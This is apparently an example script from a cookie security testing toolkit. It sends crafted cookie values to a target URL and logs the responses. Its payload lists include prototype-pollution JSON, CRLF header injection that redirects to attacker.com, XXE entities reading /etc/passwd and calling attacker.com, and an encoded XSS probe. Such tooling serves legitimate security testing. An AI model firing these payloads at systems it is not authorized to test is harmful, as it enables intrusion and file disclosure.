#!/usr/bin/env python3
"""
Custom Cookie Testing Script

This script demonstrates how to create custom cookie tests using the
Cookie Confusion Toolkit's APIs. Use this as a starting point for
your own specialized testing scenarios.

Usage:
  python3 custom_tests.py https://example.com
"""
import argparse
import json
import os
import sys
from datetime import datetime

# Adjust path to import the toolkit modules
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from src.clientfork import ClientFork
from src.cookiebomb import CookieBomb
from src.serverdrift import ServerDrift
from src.utils.common import logger, safe_request
from src.utils.cookie_utils import Cookie, create_malformed_cookie


def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Custom Cookie Testing Script")
    parser.add_argument("target", help="Target URL to test")
    parser.add_argument("--output-dir", default="./results", help="Output directory")
    parser.add_argument("--cookie-name", default="session", help="Cookie name to test")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")
    return parser.parse_args()


class CustomCookieTester:
    """Custom cookie testing class that combines various toolkit features."""

    def __init__(self, target, output_dir, cookie_name, verbose=False):
        """Initialize the tester."""
        self.target = target
        self.output_dir = output_dir
        self.cookie_name = cookie_name
        self.verbose = verbose

        # Setup output directory
        os.makedirs(output_dir, exist_ok=True)

        # Initialize results dictionary
        self.results = {
            "target": target,
            "cookie_name": cookie_name,
            "timestamp": datetime.now().isoformat(),
            "tests": {},
        }

        # Setup logging
        if verbose:
            logger.setLevel("DEBUG")

    def test_unicode_manipulation(self):
        """
        Test how the server handles Unicode characters in cookie names and values.
        This can identify parser inconsistencies with internationalized cookies.
        """
        logger.info("Testing Unicode manipulation...")

        results = {
            "description": "Testing Unicode character handling in cookies",
            "variations": [],
            "results": [],
        }

        # Unicode variations to test
        unicode_variations = [
            {"name": self.cookie_name, "value": "normal_value"},
            {
                "name": self.cookie_name,
                "value": "unicode_value_\u00e9\u00e8\u00e0",
            },  # Latin accents
            {"name": self.cookie_name, "value": "unicode_value_\u0431\u0434\u0436"},  # Cyrillic
            {"name": self.cookie_name, "value": "unicode_value_\u4e2d\u6587\u5b57"},  # Chinese
            {"name": f"{self.cookie_name}_\u00e9", "value": "accented_name"},  # Accent in name
            {"name": self.cookie_name, "value": "\u200b\u200bvalue\u200b"},  # Zero-width spaces
            {
                "name": self.cookie_name,
                "value": "RTL_\u061c\u0628\u0644\u062f",
            },  # Right-to-left text
            {"name": self.cookie_name, "value": "\ud83d\ude00emoji\ud83d\ude00"},  # Emojis
        ]

        results["variations"] = unicode_variations

        # Test each variation
        for variation in unicode_variations:
            cookie_str = f"{variation['name']}={variation['value']}"

            response = safe_request(self.target, headers={"Cookie": cookie_str})

            if response:
                result = {
                    "variation": variation,
                    "sent_cookie": cookie_str,
                    "status_code": response.status_code,
                    "received_cookies": dict(response.cookies),
                    "headers": dict(response.headers),
                }

                # Check if the cookie was reflected in the response
                response_text = response.text.lower()
                if variation["value"].lower() in response_text:
                    result["value_reflected"] = True

                results["results"].append(result)

        self.results["tests"]["unicode_manipulation"] = results
        return results

    def test_json_in_cookies(self):
        """
        Test how the server handles JSON data in cookie values.
        This can identify potential JSON parsing vulnerabilities.
        """
        logger.info("Testing JSON in cookies...")

        results = {
            "description": "Testing JSON data in cookie values",
            "variations": [],
            "results": [],
        }

        # JSON variations to test
        json_variations = [
            {"name": self.cookie_name, "value": '{"key":"value"}'},
            {"name": self.cookie_name, "value": '{"admin":true}'},
            {"name": self.cookie_name, "value": '{"admin":false,"role":"user"}'},
            {"name": self.cookie_name, "value": '{"__proto__":{"admin":true}}'},
            {"name": self.cookie_name, "value": '{"constructor":{"prototype":{"admin":true}}}'},
            {"name": self.cookie_name, "value": "[1,2,3]"},
            {"name": self.cookie_name, "value": '{"key":"value\\"with\\"quotes"}'},
            {"name": self.cookie_name, "value": '{"key":"value","nested":{"admin":true}}'},
        ]

        results["variations"] = json_variations

        # Test each variation
        for variation in json_variations:
            cookie_str = f"{variation['name']}={variation['value']}"

            response = safe_request(self.target, headers={"Cookie": cookie_str})

            if response:
                result = {
                    "variation": variation,
                    "sent_cookie": cookie_str,
                    "status_code": response.status_code,
                    "received_cookies": dict(response.cookies),
                    "headers": dict(response.headers),
                }

                # Look for error indicators in the response
                response_text = response.text.lower()
                error_indicators = [
                    "json",
                    "syntax",
                    "parse",
                    "error",
                    "exception",
                    "unexpected",
                    "token",
                    "position",
                    "invalid",
                ]

                errors_found = [
                    indicator for indicator in error_indicators if indicator in response_text[:1000]
                ]

                if errors_found:
                    result["possible_errors"] = errors_found

                results["results"].append(result)

        self.results["tests"]["json_in_cookies"] = results
        return results

    def test_cookie_header_injection(self):
        """
        Test for cookie header injection vulnerabilities.
        This can identify potential HTTP header injection points.
        """
        logger.info("Testing cookie header injection...")

        results = {
            "description": "Testing cookie header injection",
            "variations": [],
            "results": [],
        }

        # Header injection variations to test
        injection_variations = [
            {"name": self.cookie_name, "value": "normal_value"},
            {"name": self.cookie_name, "value": "value\r\nX-Injected-Header: value"},
            {"name": self.cookie_name, "value": "value\nX-Injected-Header: value"},
            {"name": self.cookie_name, "value": "value\rX-Injected-Header: value"},
            {"name": f"{self.cookie_name}\r\nX-Injected-Header: value", "value": "name_injection"},
            {"name": self.cookie_name, "value": "value\r\n\r\n<html>injection</html>"},
            {"name": self.cookie_name, "value": "value\r\nSet-Cookie: injected=value"},
            {"name": self.cookie_name, "value": "value\r\nLocation: https://attacker.com"},
        ]

        results["variations"] = injection_variations

        # Test each variation
        for variation in injection_variations:
            cookie_str = f"{variation['name']}={variation['value']}"

            response = safe_request(self.target, headers={"Cookie": cookie_str})

            if response:
                result = {
                    "variation": variation,
                    "sent_cookie": cookie_str,
                    "status_code": response.status_code,
                    "received_cookies": dict(response.cookies),
                    "headers": dict(response.headers),
                }

                # Check if any injected headers appear in the response
                if "X-Injected-Header" in response.headers:
                    result["header_injection_succeeded"] = True

                # Check if any additional cookies were set
                if "injected" in response.cookies:
                    result["cookie_injection_succeeded"] = True

                results["results"].append(result)

        self.results["tests"]["cookie_header_injection"] = results
        return results

    def test_xml_entities_in_cookies(self):
        """
        Test how the server handles XML entities in cookie values.
        This can identify potential XXE vulnerabilities in XML-based parsers.
        """
        logger.info("Testing XML entities in cookies...")

        results = {
            "description": "Testing XML entities in cookie values",
            "variations": [],
            "results": [],
        }

        # XML entity variations to test
        xml_variations = [
            {"name": self.cookie_name, "value": "normal_value"},
            {
                "name": self.cookie_name,
                "value": '<!DOCTYPE test [<!ENTITY xxe "test">]><x>&xxe;</x>',
            },
            {
                "name": self.cookie_name,
                "value": '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
            },
            {
                "name": self.cookie_name,
                "value": '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/collect">]><x>&xxe;</x>',
            },
            {"name": self.cookie_name, "value": "<![CDATA[test]]>"},
            {"name": self.cookie_name, "value": '<?xml version="1.0"?><test>value</test>'},
            {"name": self.cookie_name, "value": "value&apos;value&quot;value&lt;value&gt;"},
            {
                "name": self.cookie_name,
                "value": "value&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            },
        ]

        results["variations"] = xml_variations

        # Test each variation
        for variation in xml_variations:
            cookie_str = f"{variation['name']}={variation['value']}"

            response = safe_request(self.target, headers={"Cookie": cookie_str})

            if response:
                result = {
                    "variation": variation,
                    "sent_cookie": cookie_str,
                    "status_code": response.status_code,
                    "received_cookies": dict(response.cookies),
                    "headers": dict(response.headers),
                }

                # Look for XML error indicators in the response
                response_text = response.text.lower()
                error_indicators = [
                    "xml",
                    "entity",
                    "dtd",
                    "parser",
                    "syntax",
                    "malformed",
                    "error",
                    "exception",
                    "invalid",
                ]

                errors_found = [
                    indicator for indicator in error_indicators if indicator in response_text[:1000]
                ]

                if errors_found:
                    result["possible_errors"] = errors_found

                results["results"].append(result)

        self.results["tests"]["xml_entities_in_cookies"] = results
        return results

    def run_all_tests(self):
        """Run all custom tests."""
        logger.info(f"Starting custom cookie tests against {self.target}...")

        self.test_unicode_manipulation()
        self.test_json_in_cookies()
        self.test_cookie_header_injection()
        self.test_xml_entities_in_cookies()

        # Save results
        output_file = os.path.join(
            self.output_dir, f'custom_tests_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        )
        with open(output_file, "w") as f:
            json.dump(self.results, f, indent=2)

        logger.info(f"All custom tests completed. Results saved to {output_file}")
        return self.results


def main():
    """Main function."""
    args = parse_args()

    try:
        # Create and run custom tester
        tester = CustomCookieTester(
            target=args.target,
            output_dir=args.output_dir,
            cookie_name=args.cookie_name,
            verbose=args.verbose,
        )

        results = tester.run_all_tests()

        # Display summary
        print("\nTest Summary:")
        print(f"Target: {args.target}")
        print(f"Cookie Name: {args.cookie_name}")

        for test_name, test_results in results["tests"].items():
            print(f"\n{test_name.replace('_', ' ').title()}:")
            print(f"  Variations tested: {len(test_results['variations'])}")
            print(f"  Results collected: {len(test_results['results'])}")

            # Count interesting findings
            error_count = sum(1 for r in test_results["results"] if r.get("possible_errors"))
            injection_count = sum(
                1
                for r in test_results["results"]
                if r.get("header_injection_succeeded") or r.get("cookie_injection_succeeded")
            )
            reflection_count = sum(1 for r in test_results["results"] if r.get("value_reflected"))

            if error_count:
                print(f"  Error indicators found: {error_count}")
            if injection_count:
                print(f"  Injection success indicators: {injection_count}")
            if reflection_count:
                print(f"  Value reflection detected: {reflection_count}")

    except KeyboardInterrupt:
        logger.info("Testing interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Error during testing: {str(e)}")
        if args.verbose:
            import traceback

            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
